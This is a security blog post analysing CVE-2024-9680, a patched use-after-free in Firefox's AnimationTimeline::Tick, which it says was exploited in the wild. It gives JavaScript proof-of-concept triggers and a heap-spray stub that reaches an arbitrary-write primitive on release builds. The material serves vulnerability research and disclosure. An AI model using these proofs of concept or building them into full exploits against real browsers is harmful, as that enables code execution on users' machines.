---
date: 2024-11-14
title: "Firefox Animation CVE-2024-9680"
url: /2024/11/14/firefox-animation-cve-2024-9680.html
---

In this post, we delve into the analysis of a recent vulnerability CVE-2024-9680
patched in Firefox 131.0.2. This bug, categorized as a use-after-free issue in
animation timelines, was reportedly exploited in the wild. While publicly
available information on the vulnerability is limited, our investigation
provides a deep dive into how this issue could be triggered and exploited.

<!--more-->

## Introduction

In October, I came across a [post on X] discussing a Firefox vulnerability that
was fixed in Firefox 131.0.2. To gather more details about this CVE, my first
instinct was to check the Mozilla security advisory [2024-51]:

> CVE-2024-9680: Use-after-free in Animation timeline

> An attacker was able to achieve code execution in the content process by
> exploiting a use-after-free in Animation timelines. We have had reports of
> this vulnerability being exploited in the wild.

The next step is typically to search for the bug patch and any available Proof
of Concept (PoC). However, public information was limited, and there was no PoC
available. So, I decided to analyze this bug myself and share my findings in a
blog post.

[post on X]: https://x.com/xvonfers/status/1844044491747119265
[2024-51]: https://www.mozilla.org/en-US/security/advisories/mfsa2024-51/


## Vulnerability

The commit [0ee07613d050] addresses the bug, but the most interesting changes
are in [AnimationTimeline.cpp].

```cpp
// Before patch
bool AnimationTimeline::Tick(TickState& aState) {
  //...
  nsTArray<Animation*> animationsToRemove;
  for (Animation* animation = mAnimationOrder.getFirst(); animation;
       animation =
           static_cast<LinkedListElement<Animation>*>(animation)->getNext()) {
    //...
    animation->Tick(aState);
    if (!animation->NeedsTicks()) {
      animationsToRemove.AppendElement(animation);
    }
  }

  for (Animation* animation : animationsToRemove) {
    RemoveAnimation(animation);
  }
  return needsTicks;
}
```

```cpp
// After patch
bool AnimationTimeline::Tick(TickState& aState) {
  //...
  AutoTArray<RefPtr<Animation>, 32> animationsToTick;
  for (Animation* animation : mAnimationOrder) {
    animationsToTick.AppendElement(animation);
  }

  for (Animation* animation : animationsToTick) {
    // ...
    animation->Tick(aState);
    if (!animation->NeedsTicks()) {
      RemoveAnimation(animation);
    }
  }
  return needsTicks;
}
```

As you can see, they replaced `Animation*` with `RefPtr<Animation>` in the loop.
This change addresses not one but two use-after-free vulnerabilities! Before
exploring how these issues are triggered, it is essential to understand how
objects are tracked in this part of the code.

[0ee07613d050]: https://hg.mozilla.org/mozilla-central/rev/0ee07613d0506da465539cfaff1826cdc8bf0384
[AnimationTimeline.cpp]: https://hg.mozilla.org/mozilla-central/comparison/0ee07613d0506da465539cfaff1826cdc8bf0384/dom/animation/AnimationTimeline.cpp#l45


## References Tracking

Each animation maintains a reference-counted pointer to its timeline through
`mTimeline`, and each timeline holds reference-counted pointers to its
animations in `mAnimations`:

```cpp
class Animation : public DOMEventTargetHelper,
                  public LinkedListElement<Animation> {
  RefPtr<AnimationTimeline> mTimeline;
};

class AnimationTimeline : public DOMEventTargetHelper,
                  public LinkedListElement<Animation> {
  using AnimationSet = nsTHashSet<nsRefPtrHashKey<dom::Animation>>;
  AnimationSet mAnimations;
  LinkedList<dom::Animation> mAnimationOrder;
};
```

Additionally, `mAnimationOrder` maintains a linked list of all animations, where
each animation has a raw pointer (next/prev) to the preceding and following
animations. To summarize the situation:

<figure class="df-figure">
  <a href="/img/no_uaf.svg" aria-label="Open animation reference diagram at full size"><img alt="JavaScript retains both animations; each animation and the timeline have a reference count of 2." src="/img/no_uaf.svg" width="1344" height="924" loading="lazy" decoding="async"></a>
  <figcaption>Animation references and raw linked-list pointers. <a href="/img/no_uaf.svg">View full size ↗</a></figcaption>
</figure>

The reference to an animation is removed when `RemoveAnimation` is called:

```cpp
void AnimationTimeline::RemoveAnimation(Animation* aAnimation) {
  if (static_cast<LinkedListElement<Animation>*>(aAnimation)->isInList()) {
    // aAnimation remove itself from mAnimationOrder
    static_cast<LinkedListElement<Animation>*>(aAnimation)->remove();
  }
  mAnimations.Remove(aAnimation); // Remove the animation reference
}
```

At this point, we can identify two potential issues if we return to JavaScript
during the loop:

1. The `AnimationTimeline` object remains alive only because it is being used in
   animations. Otherwise, its reference count would drop to zero, causing it to
   be freed.
2. Animations are kept alive through references in JavaScript and in
   AnimationTimeline's `mAnimations`. If these references are removed, the
   pointers in `animationsToRemove` would end up pointing to freed objects.
  

## Back to JavaScript

To trigger either of the use-after-free vulnerabilities, we need to return to
JavaScript during the main loop:

```cpp
bool AnimationTimeline::Tick(TickState& aState) {
  //...
  for (Animation* animation = mAnimationOrder.getFirst(); animation;
       animation =
           static_cast<LinkedListElement<Animation>*>(animation)->getNext()) {
    animation->Tick(aState); // HERE
  }
  //...
}
```

When the animation is ticked, the method `TryTriggerNow` is called. If the
animation state is pending, it will resume. If an `mReady` promise is
registered, this promise will execute asynchronously:

```cpp
void Animation::Tick(AnimationTimeline::TickState& aTickState) {
  if (Pending()) {
    if (!mPendingReadyTime.IsNull()) {
      TryTriggerNow();
    }
    //...
  }
  //...
}

bool Animation::TryTriggerNow() {
  //...
  FinishPendingAt(currentTime.Value());
  return true;
}

void FinishPendingAt(const TimeDuration& aReadyTime) {
  if (mPendingState == PendingState::PlayPending) {
    ResumeAt(aReadyTime);
  }
  //...
}

void Animation::ResumeAt(const TimeDuration& aReadyTime) {
  //...
  if (mReady) {
    mReady->MaybeResolve(this);
  }
}
```

The challenge we face is that we need this promise to resume synchronously!
Fortunately, it is still possible to trigger a callback synchronously:

```cpp
void MaybeResolve(T&& aArg) {
  MaybeSomething(std::forward<T>(aArg), &Promise::MaybeResolve);
}

void Promise::MaybeResolve(JSContext* aCx, JS::Handle<JS::Value> aValue) {
  JS::Rooted<JSObject*> p(aCx, PromiseObj());
  if (!p || !JS::ResolvePromise(aCx, p, aValue)) {
    //...
  }
}

// js/src/builtin/Promise.cpp
bool js::ResolvePromiseInternal(
    JSContext* cx, JS::Handle<JSObject*> promise,
    JS::Handle<JS::Value> resolutionVal) {
  //...
  // Step 9. Let then be Get(resolution, "then").
  RootedValue thenVal(cx);
  bool status =
      GetProperty(cx, resolution, resolution, cx->names().then, &thenVal);
  //...
}
```

When `MaybeResolve` is called, the `.then` property is accessed. By setting a
getter on this property, we can trigger a callback when it is accessed:

```js
Object.defineProperty(Animation.prototype, "then", {
  get() {
    console.log("Object.property.then called");
  }
});
```

As a result, when `animation->Tick()` is called, our getter on `Animation.then`
will be executed.


## DocumentTimeline UAF

The simplest use-after-free vulnerability to trigger involves removing all
timeline references in JavaScript during the `Tick()`:

<figure class="df-figure">
  <a href="/img/uaf_timeline.svg" aria-label="Open DocumentTimeline use-after-free diagram at full size"><img alt="Clearing both timeline references frees AnimationTimeline; RemoveAnimation is called through its freed VTable." src="/img/uaf_timeline.svg" width="1344" height="964" loading="lazy" decoding="async"></a>
  <figcaption>DocumentTimeline use-after-free: the timeline reaches a reference count of zero. <a href="/img/uaf_timeline.svg">View full size ↗</a></figcaption>
</figure>

At the end of the loop, `this.RemoveAnimation` will be called:

```cpp
bool AnimationTimeline::Tick(TickState& aState) {
  //...
  nsTArray<Animation*> animationsToRemove;
  for (Animation* animation = mAnimationOrder.getFirst(); animation;
       animation =
           static_cast<LinkedListElement<Animation>*>(animation)->getNext()) {
    //...
    animation->Tick(aState);                          // Free AnimationTimeline 
    //...
  }

  for (Animation* animation : animationsToRemove) {
    RemoveAnimation(animation);                       // UAF
  }
  return needsTicks;
}
```

Here is a minimal PoC:

```js
async function main() {
  let timeline = new DocumentTimeline();
  let animation = new Animation(null, timeline); 
  animation.play();

  // Set .ready to be sure that our promise will be resolved synchonously.
  animation.ready;

  Object.defineProperty(Animation.prototype, "then", {
    get() {
      // Free the timeline
      // Setting this.timeline = null will trigger an infinite loop
      this.timeline = new DocumentTimeline();
      timeline = null;

      FuzzingFunctions.garbageCollect();
      FuzzingFunctions.cycleCollect();
      return undefined;
    }
  });
}

main();
```

This results in a call on a freed virtual table, which is not ideal for
exploitation at this point, so let's explore the second use-after-free.


## Animation UAF

This time, we will exploit the array of raw pointers in `animationsToRemove`:

<figure class="df-figure">
  <a href="/img/uaf_animation.svg" aria-label="Open Animation use-after-free diagram at full size"><img alt="Animation 1 is freed, but animationsToRemove still holds its raw pointer. Animation 2 and the timeline remain alive." src="/img/uaf_animation.svg" width="1344" height="1040" loading="lazy" decoding="async"></a>
  <figcaption>Animation use-after-free: a raw pointer remains in animationsToRemove. <a href="/img/uaf_animation.svg">View full size ↗</a></figcaption>
</figure>

```cpp
bool AnimationTimeline::Tick(TickState& aState) {
  //...
  nsTArray<Animation*> animationsToRemove;
  for (Animation* animation = mAnimationOrder.getFirst(); animation;
       animation =
           static_cast<LinkedListElement<Animation>*>(animation)->getNext()) {
    //...
    animation->Tick(aState);                        // Free the prev animation 
    if (!animation->NeedsTicks()) {
      animationsToRemove.AppendElement(animation); // Add the raw pointer
    }
  }

  // animationsToRemove[0] point to a free Animation

  for (Animation* animation : animationsToRemove) {
    RemoveAnimation(animation);                       
  }
  return needsTicks;
}

void AnimationTimeline::RemoveAnimation(Animation* aAnimation) {
  if (static_cast<LinkedListElement<Animation>*>(aAnimation)->isInList()) {
    static_cast<LinkedListElement<Animation>*>(aAnimation)->remove(); // UAF
  }
  //...
}

bool isInList() const {
  return mNext != this;
}
void remove() {
  mPrev->mNext = mNext;
  mNext->mPrev = mPrev;
  mNext = this;
  mPrev = this;
}
```

Here is the PoC:

```js
async function main() {
  let timeline = new DocumentTimeline();

  let animation = new Animation(null, timeline);  // The one which will be free
  let animation2 = new Animation(null, timeline);

  animation.play();
  animation2.play();

  // Set .ready to be sure that our promise will be resolved synchonously.
  // animation.ready; // Don't set on the first one to be able to free it
  animation2.ready;

  Object.defineProperty(Animation.prototype, "then", {
    get() {
      // Free our Animation
      animation.timeline = null;  // RemoveAnimation()
      animation  = null;          // Release() 

      FuzzingFunctions.garbageCollect();
      FuzzingFunctions.cycleCollect();
      return undefined;
    }
  });
}

main();
```


## Next steps

The `FuzzingFunctions` are helpful but unavailable in the release version of
Firefox, so we need alternatives. For garbage collection, the replacement is
straightforward:

```js
/** FuzzingFunctions.garbageCollect() */ 
function garbageCollect() {
  // Allocate 128 MB to trigger the TOO_MUCH_MALLOC garbage collection
  const maxMallocBytes = 128 * 1024 * 1024;
  for (let i = 0; i < 3; i++) {
    var x = new ArrayBuffer(maxMallocBytes);
  }
}
```

However, for cycle collection, we need to halt the current thread temporarily to
allow the `AsyncFreeSnowWhite` thread to execute. The simplest approach I have
found is to use a synchronous `XMLHttpRequest`:

```js
/** FuzzingFunctions.cycleCollect() */
function cycleCollect() {
  // Trigger the thread AsyncFreeSnowWhite
  const request = new XMLHttpRequest();
  request.open("GET", "", false);       // synchronous fetch
  request.send(null);
}
```

To exploit our unlink primitive, we should spray an array of pointers matching
the size of `Animation` to facilitate pointer leakage and bypass ASLR. I did not
find an exact match in my quick research, so I will leave that as an exercise
for the reader.

In fact, even without an object of the correct size for the heap spray - in this
case, the bucket `(304, 320]` - you can simply free entire pages of that object
size. Eventually, these pages will be reused for objects of different sizes,
which suffices to demonstrate our `0x41414141` arbitrary write:

```js
/** FuzzingFunctions.garbageCollect() */ 
function garbageCollect() {
  // Allocate 128 MB to trigger the TOO_MUCH_MALLOC garbage collection
  const maxMallocBytes = 128 * 1024 * 1024;
  for (let i = 0; i < 3; i++) {
    var x = new ArrayBuffer(maxMallocBytes);
  }
}

/** FuzzingFunctions.cycleCollect() */
function cycleCollect() {
  // Trigger the thread AsyncFreeSnowWhite
  const request = new XMLHttpRequest();
  request.open("GET", "", false);       // synchronous fetch
  request.send(null);
}

async function main() {
  const xslt_data0 = '<?xml version="1.0" encoding="UTF-8"?>' +
  '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
  '</xsl:stylesheet>';
  var parser = new DOMParser();
  var xslt0 = parser.parseFromString(xslt_data0, "text/xml");
  var xslt_processor0 = new XSLTProcessor();
  xslt_processor0.reset();
  xslt_processor0.importStylesheet(xslt0);

  let timeline = new DocumentTimeline();

  let sprayAnim = [];
  for (let i = 0; i < 200; i++) {
    sprayAnim.push(new Animation());
  }

  let animation = new Animation(null, timeline);  // the one which will be free
  animation.id = "first";                         // used for debug
  
  for (let i = 0; i < 200; i++) {
    sprayAnim.push(new Animation());
  }

  let animation2 = new Animation(null, timeline);

  animation.play();
  animation2.play();

  animation2.ready;

  Object.defineProperty(Animation.prototype, "then", {
    get() {
      animation.timeline = null;  // RemoveAnimation()
      animation  = null;          // Release() 

      for (let i = 0; i < sprayAnim.length; i++) {
        sprayAnim[i] = null;
      }
      sprayAnim = null;

      // Free our Animation
      garbageCollect();
      cycleCollect();

      // Replace the object with controlled pointers
      let content = String.fromCodePoint(0x4142).repeat(128/2);
      for(let i = 0; i < 1000; i++) {
        xslt_processor0.setParameter(null, "fill_" + i, content);
      }

      /*
        void remove() {
          mPrev->mNext = mNext;
          mNext->mPrev = mPrev;
          mNext = this;
          mPrev = this;
        }
        mov    rax, QWORD PTR [rbx+0x70]
        mov    rcx, QWORD PTR [rbx+0x78]
        mov    QWORD PTR [rcx], rax
        mov    rcx, QWORD PTR [rbx+0x78]
        mov    QWORD PTR [rax+0x8], rcx
        mov    QWORD PTR [rbx+0x70], r15
        mov    QWORD PTR [rbx+0x78], r15
     */
      return undefined;
    }
  });
}

main();
```


## Conclusion

This was my first deep dive into Firefox, and I had a lot of fun analyzing this
bug.

Interestingly, a Chrome bug [40058745] reported back in February 2020 involved a
very similar vulnerability.

Many thanks to [mistymntncop] for collaborating on this bug analysis!

[40058745]: https://issues.chromium.org/issues/40058745
[mistymntncop]: https://x.com/mistymntncop
